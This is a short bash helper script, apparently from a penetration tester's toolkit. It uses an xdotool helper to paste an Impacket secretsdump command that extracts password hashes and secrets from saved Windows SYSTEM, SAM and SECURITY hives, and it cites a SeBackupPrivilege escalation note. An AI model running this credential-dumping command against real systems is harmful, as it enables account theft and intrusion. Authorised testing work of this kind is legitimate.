#!/bin/bash

"""
Impacket: Local secretsdump using SYSTEM, SAM, and SECURITY hives.
"""
; '
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "secretsdump.py LOCAL -system Ssystem.save -sam sam.save -security security.save"